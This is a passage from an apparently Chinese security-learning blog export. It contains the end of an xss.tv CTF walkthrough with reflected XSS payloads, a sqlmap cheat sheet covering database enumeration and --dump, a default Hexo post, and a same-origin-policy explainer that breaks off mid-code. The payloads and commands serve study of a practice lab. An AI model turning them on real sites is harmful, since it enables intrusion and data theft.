<td align="left">换行(LF)</td>
<td align="left">%0a</td>
</tr>
<tr>
<td align="left">空格</td>
<td align="left">%0c</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?keyword&#x3D;&lt;img%0Asrc&#x3D;&quot;xss&quot;%0Aonerror&#x3D;alert()&gt;</span><br></pre></td></tr></table></figure>


<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310204737849.png" alt="image-20210310204737849"></p>
<p>URL传进去的参数会再<code>&lt;embed&gt;</code>里显示，以个是在<code>=</code>前面，一个是在<code>=</code>后面，那我们是不是可以前一个作为事件名字，后一个作为事件执行的操作呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?arg01&#x3D;onmouseover&amp;arg02&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310205415002.png" alt="image-20210310205415002"></p>
<p>似乎多了个<code>&quot;</code>，吧<code>&quot;</code>去掉换成空格，即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?arg01&#x3D; onmouseover&amp;arg02&#x3D;alert(1)</span><br></pre></td></tr></table></figure>


<h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>没发现和level 17 有啥区别，上题的payload也依然能用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?arg01&#x3D; onmouseover&amp;arg02&#x3D;alert(1)</span><br></pre></td></tr></table></figure>


<h2 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h2><p>现在的浏览器都不支持flash了，再学这个似乎也没意义，给了自己一个理由偷懒（主要是网上都没找到答案）</p>
<h2 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h2><p>同上</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://blog.csdn.net/qq_43221499/article/details/91355234" >学习笔记五：xss.tv通关笔记<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.lhaihai.top/post/xsstv%E6%8C%91%E6%88%98%E8%B5%9B/" >XSSTV挑战赛<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.sqlsec.com/2020/01/xss.html" >XSS从零开始<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLmap 常用命令</title>
    <url>/2021/03/07/SQLmap%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>这里是一些我自己用过的或者感觉上回比较实用的一些sqlmap参数命令，有新的会不断补充</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
<p>sqlmap支持五种不同的注入模式：</p>
<ol>
<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
<li>联合查询注入，可以使用union的情况下的注入。</li>
<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
</ol>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><ul>
<li>首先是sql自带的帮助文档</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -hh</span><br></pre></td></tr></table></figure>


<ul>
<li>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0、只显示python错误以及严重的信息。</span><br><span class="line">1、同时显示基本信息和警告信息。（默认）</span><br><span class="line">2、同时显示debug信息。</span><br><span class="line">3、同时显示注入的payload。</span><br><span class="line">4、同时显示HTTP请求。</span><br><span class="line">5、同时显示HTTP响应头。</span><br><span class="line">6、同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure>
<p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p>
<h3 id="目标选定"><a href="#目标选定" class="headerlink" title="目标选定"></a>目标选定</h3><h4 id="直接连接到数据库"><a href="#直接连接到数据库" class="headerlink" title="直接连接到数据库"></a>直接连接到数据库</h4><p>参数：-d</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -d &quot;mysql:&#x2F;&#x2F;admin:admin@127.0.0.1:3306&#x2F;db&quot;</span><br></pre></td></tr></table></figure>
<p>对单个数据库运行sqkmap</p>
<h4 id="指定URL"><a href="#指定URL" class="headerlink" title="指定URL"></a>指定URL</h4><p>参数：-u 或者 –url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http(s):&#x2F;&#x2F;targeturl:[port]&#x2F;[...]&quot; </span><br></pre></td></tr></table></figure>


<h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><h4 id="HTTP数据"><a href="#HTTP数据" class="headerlink" title="HTTP数据"></a>HTTP数据</h4><p>参数：–data</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http(s):&#x2F;&#x2F;targeturl:[port]&#x2F;[...]&quot; --data&#x3D;&quot;id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>
<p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数</p>
<h4 id="HTTP-cookie头"><a href="#HTTP-cookie头" class="headerlink" title="HTTP cookie头"></a>HTTP cookie头</h4><p>参数：–cookie,–load-cookies,–drop-set-cookie</p>
<p>这个参数在以下两个方面很有用：</p>
<ol>
<li><p>web应用需要登陆的时候。</p>
</li>
<li><p>你想要在这些头参数中测试SQL注入时。</p>
</li>
</ol>
<p>可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。</p>
<p>在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。</p>
<p>如果你不想接受Set-Cookie可以使用–drop-set-cookie参数来拒接。</p>
<p>当你使用–cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。</p>
<h4 id="HTTP-User-Agent头"><a href="#HTTP-User-Agent头" class="headerlink" title="HTTP User-Agent头"></a>HTTP User-Agent头</h4><p>参数：–user-agent,–random-agent</p>
<p>用于指定 user-agent ，当使用 –random-agent 时，sqlmap会从./txt/user-agents.txt获取参数。</p>
<p>当–level的参数设定为3或者3以上的时候，sqlmap会尝试注入User-Agent参数。</p>
<h4 id="HTTP-Host头"><a href="#HTTP-Host头" class="headerlink" title="HTTP Host头"></a>HTTP Host头</h4><p>参数：–host</p>
<p>用于指定 host 的值。</p>
<h4 id="HTTP-Referer头"><a href="#HTTP-Referer头" class="headerlink" title="HTTP Referer头"></a>HTTP Referer头</h4><p>参数：–referer</p>
<p>sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入。</p>
<h4 id="额外的HTTP头"><a href="#额外的HTTP头" class="headerlink" title="额外的HTTP头"></a>额外的HTTP头</h4><p>参数：–headers</p>
<p>可以通过–headers参数来增加额外的http头。</p>
<h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><h4 id="指定数据库类型"><a href="#指定数据库类型" class="headerlink" title="指定数据库类型"></a>指定数据库类型</h4><p>参数：–dbms</p>
<p>默认sqlmap会自动探测web应用后端的数据库是什么</p>
<h4 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h4><p>参数：–risk</p>
<p>设置测试用例的类型,默认是1, 会使用常见的注入用例,2:加入基于时间的盲注, 3: 增加基于OR的测试用例，在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>
<h3 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h3><h4 id="注入所使用的类型"><a href="#注入所使用的类型" class="headerlink" title="注入所使用的类型"></a>注入所使用的类型</h4><p>参数：–technique</p>
<ul>
<li>B: Boolean-based blind SQL injection（布尔型注入）</li>
<li>E: Error-based SQL injection（报错型注入）</li>
<li>U: UNION query SQL injection（可联合查询注入）</li>
<li>S: Stacked queries SQL injection（可多语句查询注入）</li>
<li>T: Time-based blind SQL injection（基于时间延迟注入）</li>
</ul>
<h3 id="列数据"><a href="#列数据" class="headerlink" title="列数据"></a>列数据</h3><h4 id="列出数据库系统的数据库"><a href="#列出数据库系统的数据库" class="headerlink" title="列出数据库系统的数据库"></a>列出数据库系统的数据库</h4><p>参数：–dbs</p>
<p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p>
<h4 id="列举数据库表"><a href="#列举数据库表" class="headerlink" title="列举数据库表"></a>列举数据库表</h4><p>参数：–tables</p>
<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p>
<p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p>
<h4 id="列举数据库表中的字段"><a href="#列举数据库表中的字段" class="headerlink" title="列举数据库表中的字段"></a>列举数据库表中的字段</h4><p>参数：–columns</p>
<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p>
<p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p>
<h4 id="获取表中数据个数"><a href="#获取表中数据个数" class="headerlink" title="获取表中数据个数"></a>获取表中数据个数</h4><p>参数：–count</p>
<p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p>
<h4 id="获取整个表的数据"><a href="#获取整个表的数据" class="headerlink" title="获取整个表的数据"></a>获取整个表的数据</h4><p>参数：–dump</p>
<p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取这个表的所有内容。</p>
<p>使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。</p>
<h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><h4 id="清除session"><a href="#清除session" class="headerlink" title="清除session"></a>清除session</h4><p>参数：–flush-session</p>
<p>会清空当前URL相关的session</p>
<h4 id="清除查询结果"><a href="#清除查询结果" class="headerlink" title="清除查询结果"></a>清除查询结果</h4><p>参数：–fresh-queries</p>
<p>清除之前的查询结果,进行重新请求操作。</p>
<h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><h4 id="初级用户向导"><a href="#初级用户向导" class="headerlink" title="初级用户向导"></a>初级用户向导</h4><p>参数：–wizard</p>
<p>面向初级用户的参数，可以一步一步交互式操作</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/12/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>同源策略</title>
    <url>/2021/03/13/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p><strong>同源策略</strong>是一个重要的安全策略，它用于限制一个<a class="link"   href="https://developer.mozilla.org/en-US/docs/Glossary/Origin" >origin<i class="fas fa-external-link-alt"></i></a>的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。</p>
<h2 id="源的定义"><a href="#源的定义" class="headerlink" title="源的定义"></a>源的定义</h2><p>如果两个URL拥有相同的<strong>协议（http、https）、端口和主机</strong>，那么这两个URL就是同源的。</p>
<p>example：</p>
<table>
<thead>
<tr>
<th>URL</th>
<th>是否同源</th>
<th>原因</th>
</tr>
</thead>
<tbody><tr>
<td><a class="link"   href="http://store.company.com/dir/page.html" >http://store.company.com/dir/page.html<i class="fas fa-external-link-alt"></i></a></td>
<td>base</td>
<td></td>
</tr>
<tr>
<td><a class="link"   href="http://store.company.com/dir2/other.html" >http://store.company.com/dir2/other.html<i class="fas fa-external-link-alt"></i></a></td>
<td>同源</td>
<td>只有路径不同</td>
</tr>
<tr>
<td><a class="link"   href="http://store.company.com/dir/inner/another.html" >http://store.company.com/dir/inner/another.html<i class="fas fa-external-link-alt"></i></a></td>
<td>同源</td>
<td>只有路径不同</td>
</tr>
<tr>
<td><a class="link"   href="https://store.company.com/secure.html" >https://store.company.com/secure.html<i class="fas fa-external-link-alt"></i></a></td>
<td>不同源</td>
<td>协议不同</td>
</tr>
<tr>
<td><a class="link"   href="http://store.company.com:81/dir/etc.html" >http://store.company.com:81/dir/etc.html<i class="fas fa-external-link-alt"></i></a></td>
<td>不同源</td>
<td>端口不同</td>
</tr>
<tr>
<td><a class="link"   href="http://news.company.com/dir/other.html" >http://news.company.com/dir/other.html<i class="fas fa-external-link-alt"></i></a></td>
<td>不同源</td>
<td>主机不同</td>
</tr>
</tbody></table>
<p>对于<code>about:blank</code>和<code>javascript:</code>这种特殊的 URL，他们的源应当是继承自加载他们的页面的源，他们本身并没有『源』的概念。</p>
<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
<p>设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？</p>
<p>很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p>
<p>由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p>
<h3 id="限制范围"><a href="#限制范围" class="headerlink" title="限制范围"></a>限制范围</h3><p>同源策略限制非同源的三种行为：</p>
<ul>
<li><p>Cookie、LocalStorage 和 IndexDB 无法读取。</p>
</li>
<li><p>DOM 无法获得。</p>
</li>
<li><p>AJAX 请求不能发送。</p>
</li>
</ul>
<h2 id="跨源访问"><a href="#跨源访问" class="headerlink" title="跨源访问"></a>跨源访问</h2><p>我们已经知道了，浏览器会根据同源策略允许或拒绝加载某些资源，但是又一个问题由此而生，我们的网站通常会将静态文件（<code>CSS</code>,<code>JS</code>, 图片）等放置在 CDN 上，那么 CDN 与当前域必然是不同源的，但是神奇的是，这些网站可以正常加载出他们需要的资源并展示给用户，这里为什么又不受同源策略的影响呢？</p>
<p>同源策略控制不同源之间的交互，例如在使用<code>XMLHttpRequest</code> 或<code>&lt;img&gt;</code>标签时则会受到同源策略的约束。这些交互通常分为三类：</p>
<ul>
<li><p>跨域<strong>写操作</strong>（Cross-origin writes）一般是被允许的。例如链接（links），重定向以及表单提交。</p>
</li>
<li><p>跨域<strong>资源嵌入</strong>（Cross-origin embedding）一般是被允许。</p>
</li>
<li><p>跨域<strong>读操作</strong>（Cross-origin reads）一般是<strong>不被允许的</strong>，但常可以通过内嵌资源来巧妙的进行读取访问。</p>
</li>
</ul>
<p>以下是可能嵌入跨源的资源的一些示例：</p>
<ul>
<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</li>
<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。</li>
<li><code>&lt;img&gt;</code> / <code>&lt;video&gt;</code> / <code>&lt;audio&gt;</code> 嵌入多媒体资源。</li>
<li><code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> 和 <code>&lt;applet&gt;</code> 的插件。</li>
<li><code>@font-face</code> 引入的字体。一些浏览器允许跨域字体( cross-origin fonts)，一些需要同源字体(same-origin fonts)。</li>
<li><code>&lt;frame&gt;</code> 和 <code>&lt;iframe&gt;</code> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</li>
</ul>
<h3 id="1、具备src的标签"><a href="#1、具备src的标签" class="headerlink" title="1、具备src的标签"></a>1、具备src的标签</h3><ul>
<li>原理：所有具有<code>src</code>属性的HTML标签都是可以跨域的</li>
</ul>
<p>在浏览器中，<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>和<code>&lt;link&gt;</code>这几个标签是可以加载跨域（非同源）的资源的，并且加载的方式其实相当于一次普通的GET请求，唯一不同的是，为了安全起见，浏览器不允许这种方式下对加载到的资源的读写操作，而只能使用标签本身应当具备的能力（比如脚本执行、样式应用等等）。</p>
<h3 id="2、JSONP跨域"><a href="#2、JSONP跨域" class="headerlink" title="2、JSONP跨域"></a>2、JSONP跨域</h3><ul>
<li>原理：<code>&lt;script&gt;</code>是可以跨域的，而且在跨域脚本中可以直接回调当前脚本的函数</li>
</ul>
<p><code>&lt;script&gt;</code>标签是可以加载异域的JavaScript并执行的，通过预先设定好的<strong>callback</strong>函数来实现和母页面的交互。它有一个大名，叫做JSONP跨域，JSONP是JSON with Padding的略称。它是一个非官方的协议，明明是加载script，为啥和JSON扯上关系呢？原来就是这个callback函数，对它的使用有一个典型的方式，就是通过JSON来传参，即将JSON数据填充进回调函数，这就是JSONP的JSON+Padding的含义。JSONP只支持GET请求。</p>
<p>a网站的前端代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params">jsondata</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//处理获得的json数据</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://haorooms.com/data.php?callback=dosomething&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>b网站的后台代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="comment">//得到回调函数名</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);<span class="comment">//要返回的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#x27;</span>.json_encode(<span class="variable">$data</span>).<span class="string">&#x27;)&#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>JSONP也存在一些安全问题，例如当对传入/传回参数没有做校验就直接执行返回的时候，会造成XSS问题。没有做Referer或Token校验就给出数据的时候，可能会造成数据泄露。</p>
<h3 id="3、跨域资源共享（CORS）"><a href="#3、跨域资源共享（CORS）" class="headerlink" title="3、跨域资源共享（CORS）"></a>3、跨域资源共享（CORS）</h3><ul>
<li>原理：服务器设置Access-Control-Allow-Origin HTTP响应头之后，浏览器将会允许跨域请求</li>
</ul>
<p>CORS是HTML5标准提出的跨域资源共享(Cross Origin Resource Share)，支持GET、POST等所有HTTP请求。CORS需要服务器端设置<code>Access-Control-Allow-Origin</code>头，否则浏览器会因为安全策略拦截返回的信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *              # 允许所有域名访问，或者</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;a.com   # 只允许所有域名访问</span><br></pre></td></tr></table></figure>


<h3 id="4、document-domain"><a href="#4、document-domain" class="headerlink" title="4、document.domain"></a>4、document.domain</h3><ul>
<li>原理：相同主域名不同子域名下的页面，可以设置document.domain让它们同域</li>
</ul>
<p>我们只需要在跨域的两个页面中设置document.domain就可以了。修改document.domain的方法只适用于不同子域的框架间的交互，要载入iframe页面。</p>
<p>example：</p>
<ol>
<li>在页面 <a class="link"   href="http://a.example.com/a.html" >http://a.example.com/a.html<i class="fas fa-external-link-alt"></i></a> 设置document.domain</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span> = <span class="string">&quot;iframe&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://b.example.com/b.html&quot;</span> <span class="attr">onload</span> = <span class="string">&quot;test()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">&#x27;example.com&#x27;</span>;<span class="comment">//设置成主域</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="built_in">document</span>.getElementById(<span class="string">&#x27;￼iframe&#x27;</span>).contentWindow);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//contentWindow 可取得子窗口的 window 对象</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>在页面 <a class="link"   href="http://b.example.com/b.html" >http://b.example.com/b.html<i class="fas fa-external-link-alt"></i></a> 中设置document.domain</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">&#x27;example.com&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//在iframe载入这个页面也设置document.domain，使之与主页面的document.domain相同</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="5、window-name"><a href="#5、window-name" class="headerlink" title="5、window.name"></a>5、window.name</h3><ul>
<li>原理：window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的。</li>
</ul>
<p>这里有三个页面：</p>
<ul>
<li>sever.com/a.html 数据存放页面</li>
<li>agent.com/b.html 数据获取页面</li>
<li>agent.com/c.html 空页面，做代理使用</li>
</ul>
<p>a.html中，设定<code>window.name</code>作为需要传递的值</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.name = <span class="string">&#x27;I was there!&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    alert(<span class="built_in">window</span>.name);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>b.html中，当iframe加载后将iframe的<code>src</code>指向同域的<code>c.html</code>，这样就可以利用<code>iframe.contentWindow.name</code>获取要传递的值了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">  iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="javascript">  iframe.style.display = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> state = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">  iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(state === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(iframe.contentWindow.name);</span></span><br><span class="line">      alert(data);</span><br><span class="line"><span class="javascript">      iframe.contentWindow.document.write(<span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line">      iframe.contentWindow.close();</span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.body.removeChild(iframe);</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(state === <span class="number">0</span>) &#123;</span></span><br><span class="line">      state = 1;</span><br><span class="line"><span class="javascript">      iframe.contentWindow.location = <span class="string">&#x27;http://agent.com/c.html&#x27;</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="javascript">  iframe.src = <span class="string">&#x27;http://sever.com/a.html&#x27;</span>;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="6、window-postMesage"><a href="#6、window-postMesage" class="headerlink" title="6、window.postMesage"></a>6、window.postMesage</h3><ul>
<li>原理: HTML5新增的postMessage方法，通过postMessage来传递信息，对方可以通过监听message事件来监听信息。可跨主域名及双向跨域。</li>
</ul>
<p>这里有两个页面：</p>
<ol>
<li>agent.com/index.html</li>
<li>server.com/remote.html</li>
</ol>
<p>本地代码index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;proxy&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://server.com/remote.html&quot;</span> <span class="attr">onload</span> = <span class="string">&quot;postMsg()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span>  </span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> obj = &#123;  </span></span><br><span class="line"><span class="javascript">            msg: <span class="string">&#x27;hello world&#x27;</span>  </span></span><br><span class="line">        &#125;  </span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">postMsg</span> (<span class="params"></span>)</span>&#123;  </span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;proxy&#x27;</span>);  </span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> win = iframe.contentWindow;  </span></span><br><span class="line"><span class="javascript">            